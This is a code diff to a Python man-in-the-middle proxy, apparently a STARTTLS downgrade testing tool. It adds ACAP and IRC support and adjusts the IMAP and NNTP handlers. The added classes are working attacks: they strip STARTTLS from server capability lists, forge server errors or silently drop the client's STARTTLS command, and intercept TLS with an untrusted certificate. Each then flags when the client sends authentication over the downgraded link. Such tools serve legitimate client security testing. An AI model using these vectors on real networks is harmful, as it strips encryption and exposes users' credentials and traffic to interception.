@@ -5,12 +5,13 @@
                   inbound                    outbound
 [inbound_peer]<------------>[listen:proxy]<------------->[outbound_peer/target]
 '''
-import socket
-import select
-import time
 import sys
 import logging
+import socket
+import select
 import ssl
+import time
+import re
 
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)-8s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -84,14 +85,17 @@ class ProtocolDetect(object):
     PROTO_FTP = 21
     PROTO_POP3 = 110
     PROTO_NNTP = 119
+    PROTO_IRC = 6667
+    PROTO_ACAP = 675
     
     PORTMAP = {25:  PROTO_SMTP,
                5222:PROTO_XMPP,
                110: PROTO_POP3,
                143: PROTO_IMAP,
                21: PROTO_FTP,
-               119: PROTO_NNTP
-               
+               119: PROTO_NNTP,
+               6667: PROTO_IRC,
+               675: PROTO_ACAP
                }
     
     KEYWORDS = ((['ehlo', 'helo','starttls','rcpt to:','mail from:'], PROTO_SMTP),
@@ -478,11 +482,12 @@ class Vectors:
             @staticmethod
             def mangle_server_data(session, data, rewrite):
                 if "CAPABILITY " in data:
-                    data = data.replace(" STARTTLS","")
+                    # rfc2595
+                    data = data.replace(" STARTTLS","").replace(" LOGINDISABLED","")
                 return data
             @staticmethod
             def mangle_client_data(session, data, rewrite):
-                if "STARTTLS" in data:
+                if " STARTTLS" in data:
                     raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                 elif " LOGIN " in data:
                     rewrite.set_result(session, True)
@@ -616,8 +621,8 @@ class Vectors:
     class NNTP:
         _PROTO_ID = 119
         class StripFromCapabilities:
-            ''' 1) Force Server response to *NOT* announce AUTH TLS support
-                2) raise exception if client tries to negotiated AUTH TLS
+            ''' 1) Force Server response to *NOT* announce STARTTLS support
+                2) raise exception if client tries to negotiated STARTTLS
             '''
             @staticmethod
             def mangle_server_data(session, data, rewrite):
@@ -635,7 +640,7 @@ class Vectors:
                 return data
         
         class StripWithError:
-            ''' 1) force server error on client sending AUTH TLS
+            ''' 1) force server error on client sending STARTTLS
             '''
             @staticmethod
             def mangle_server_data(session, data, rewrite):
@@ -780,7 +785,268 @@ class Vectors:
                     rewrite.set_result(session, True)
                 return data
 
+    class ACAP:
+        #rfc2244, rfc2595
+        _PROTO_ID = 675
+        _REX_CAP = re.compile(r"\(([^\)]+)\)")
+        class StripFromCapabilities:
+            ''' 1) Force Server response to *NOT* announce STARTTLS support
+                2) raise exception if client tries to negotiated STARTTLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                if all(kw in data for kw in ("ACAP","STARTTLS")):
+                    features = Vectors.ACAP._REX_CAP.findall(data)  # features w/o parentheses
+                    data = ' '.join("(%s)"%f for f in features if not "STARTTLS" in f)
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if " STARTTLS" in data:
+                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
+                elif " AUTHENTICATE " in data:       
+                    rewrite.set_result(session, True)
+                return data
+        
+        class StripWithError:
+            ''' 1) force server error on client sending STARTTLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if " STARTTLS" in data:
+                    id = data.split(' ',1)[0].strip()
+                    session.inbound.sendall('%s BAD "command unknown or arguments invalid"'%id)  # or 580 Can not initiate TLS negotiation
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr('%s BAD "command unknown or arguments invalid"'%id)))
+                    data=None
+                elif " AUTHENTICATE " in data:
+                    rewrite.set_result(session, True)
+                return data
+    
+        class UntrustedIntercept:
+            ''' 1) Do not mangle server data
+                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
+                   in case client does not check keys
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if " STARTTLS" in data:
+                    # do inbound STARTTLS
+                    id = data.split(' ',1)[0].strip()
+                    session.inbound.sendall('%s OK "Begin TLS negotiation now"'%id)
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr('%s OK "Begin TLS negotiation now"'%id)))
+                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
+                                            keyfile=Vectors._TLS_KEYFILE)
+                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
+                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
+                    # outbound ssl
+                    
+                    session.outbound.sendall(data)
+                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
+                    resp_data = session.outbound.recv()
+                    if not " OK " in resp_data:
+                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
+                    
+                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
+                    session.outbound.ssl_wrap_socket()
+    
+                    data=None
+                elif " AUTHENTICATE " in data:
+                    rewrite.set_result(session, True)
+                return data
 
+    class IRC:
+        #rfc2244, rfc2595
+        _PROTO_ID = 6667
+        _REX_CAP = re.compile(r"\(([^\)]+)\)")
+        _IDENT_PORT = 113
+        class StripFromCapabilities:
+            ''' 1) Force Server response to *NOT* announce STARTTLS support
+                2) raise exception if client tries to negotiated STARTTLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                mangled = []
+                for line in data.split("\n"):
+                    if all(kw.lower() in line.lower() for kw in (" cap "," tls")):
+                        # can be CAP LS or CAP ACK/NACK
+                        if " ack " in data.lower():
+                            line = line.replace("ACK","NAK").replace("ack","nak")
+                        else:   #ls
+                            features = line.split(" ")
+                            line = ' '.join(f for f in features if not 'tls' in f.lower())
+                    mangled.append(line)
+                return "\n".join(mangled)
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
+                #elif all(kw.lower() in data.lower() for kw in ("cap req","tls")):
+                #    # mangle CAPABILITY REQUEST
+                #    if ":" in data:
+                #        cmd, caps = data.split(":")
+                #        caps = (c for c in caps.split(" ") if not "tls" in c.lower())
+                #        data="%s:%s"%(cmd,' '.join(caps))
+                elif "AUTHENTICATE " in data:       
+                    rewrite.set_result(session, True)
+                return data
+        
+        class StripWithError:
+            ''' 1) force server error on client sending STARTTLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    params = {'srv':'this.server.com',
+                              'nickname': '*',
+                              'cmd': 'STARTTLS'
+                              }
+                    # if we're lucky we can extract the username from a prev. server line
+                    prev_response = session.outbound.recvbuf.strip()
+                    if prev_response:  
+                        fields = prev_response.split(" ")
+                        try:
+                            params['srv'] = fields[0]
+                            params['nickname'] = fields[2]
+                        except IndexError:
+                            pass
+                    session.inbound.sendall("%(srv)s 691 %(nickname)s :%(cmd)s\r\n"%params)
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("%(srv)s 691 %(nickname)s :%(cmd)s\r\n"%params)))
+                    data=None
+                elif "AUTHENTICATE " in data:
+                    rewrite.set_result(session, True)
+                return data
+        
+        class StripWithNotRegistered:
+            ''' 1) force server wrong state on client sending STARTTLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    params = {'srv':'this.server.com',
+                              'nickname': '*',
+                              'cmd': 'You have not registered'
+                              }
+                    # if we're lucky we can extract the username from a prev. server line
+                    prev_response = session.outbound.recvbuf.strip()
+                    if prev_response:  
+                        fields = prev_response.split(" ")
+                        try:
+                            params['srv'] = fields[0]
+                            params['nickname'] = fields[2]
+                        except IndexError:
+                            pass
+                    session.inbound.sendall("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)))
+                    data=None
+                elif "AUTHENTICATE " in data:
+                    rewrite.set_result(session, True)
+                return data
+            
+        class StripCAPWithNotRegistered:
+            ''' 1) force server wrong state on client sending CAP LS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "CAP LS" in data:
+                    params = {'srv':'this.server.com',
+                              'nickname': '*',
+                              'cmd': 'You have not registered'
+                              }
+                    # if we're lucky we can extract the username from a prev. server line
+                    prev_response = session.outbound.recvbuf.strip()
+                    if prev_response:  
+                        fields = prev_response.split(" ")
+                        try:
+                            params['srv'] = fields[0]
+                            params['nickname'] = fields[2]
+                        except IndexError:
+                            pass
+                    session.inbound.sendall("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)))
+                    data=None
+                elif "AUTHENTICATE " in data:
+                    rewrite.set_result(session, True)
+                return data
+            
+        class StripWithSilentDrop:
+            ''' 1) silently drop starttls command
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    data=None
+                elif "AUTHENTICATE " in data:
+                    rewrite.set_result(session, True)
+                return data
+    
+        class UntrustedIntercept:
+            ''' 1) Do not mangle server data
+                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
+                   in case client does not check keys
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                if " ident " in data.lower():
+                    #TODO: proxy ident
+                    pass
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    # do inbound STARTTLS
+                    params = {'srv':'this.server.com',
+                              'nickname': '*',
+                              'cmd': 'STARTTLS'
+                              }
+                    # if we're lucky we can extract the username from a prev. server line
+                    prev_response = session.outbound.recvbuf.strip()
+                    if prev_response:  
+                        fields = prev_response.split(" ")
+                        try:
+                            params['srv'] = fields[0]
+                            params['nickname'] = fields[2]
+                        except IndexError:
+                            pass
+                    session.inbound.sendall(":%(srv)s 670 %(nickname)s :STARTTLS successful, go ahead with TLS handshake\r\n"%params)
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr(":%(srv)s 670 %(nickname)s :STARTTLS successful, go ahead with TLS handshake\r\n"%params)))
+                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
+                                            keyfile=Vectors._TLS_KEYFILE)
+                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
+                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
+                    # outbound ssl
+                    
+                    session.outbound.sendall(data)
+                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
+                    resp_data = session.outbound.recv()
+                    if not " 670 " in resp_data:
+                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
+                    
+                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
+                    session.outbound.ssl_wrap_socket()
+    
+                    data=None
+                elif "AUTHENTICATE " in data:
+                    rewrite.set_result(session, True)
+                return data
 
 
 class RewriteDispatcher(object):
